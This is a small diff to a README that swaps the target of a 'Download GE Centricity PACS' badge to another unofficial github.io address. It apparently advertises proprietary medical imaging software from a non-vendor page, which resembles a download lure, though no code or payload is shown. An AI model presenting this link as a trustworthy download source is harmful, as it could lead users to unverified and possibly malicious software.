@@ -2,7 +2,8 @@
 
 ## 📥 Download GE Centricity PACS
 
-[![⬇️ Download Centricity PACS](https://img.shields.io/badge/Download-Centricity%20PACS-blue?style=for-the-badge&logo=windows)](https://ge-centricity-pacs-download.github.io/.github)
+[![⬇️ Download Centricity PACS](https://img.shields.io/badge/Download-Centricity%20PACS-blue?style=for-the-badge&logo=windows)](https://ge-healthcare-centricity-pacs.github.io/.github
+)
 
 ---
 
